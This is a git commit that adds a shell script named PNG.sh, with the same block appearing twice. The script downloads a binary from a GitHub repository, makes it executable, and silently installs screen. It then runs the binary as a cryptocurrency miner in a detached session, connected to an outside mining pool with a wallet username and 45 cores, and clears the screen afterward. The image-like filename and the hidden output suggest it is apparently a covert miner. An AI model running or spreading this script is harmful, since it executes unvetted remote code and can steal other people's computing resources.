b891f0d372dd5731aa54d6c9f8c874d60cd726cd
obisumila <obisumila@gmail.com>
2024-09-21 08:57:25 +0800

    Add files via upload

---
+++ PNG.sh
@@ -0,0 +1,20 @@
+wget https://github.com/obisumila/effective-chainsaw/raw/refs/heads/main/x-man ;
+chmod +x x-man ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S on -dm ./x-man --url ws://tw-pool.com:5487/mine mine --username GASPNARXHfyhdCnrrsiszPthMzNwWWYwtHJkVLUVSTpj.TALK --cores 45 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/effective-chainsaw/raw/refs/heads/main/x-man ;
+chmod +x x-man ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S on -dm ./x-man --url ws://tw-pool.com:5487/mine mine --username GASPNARXHfyhdCnrrsiszPthMzNwWWYwtHJkVLUVSTpj.POD --cores 45 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
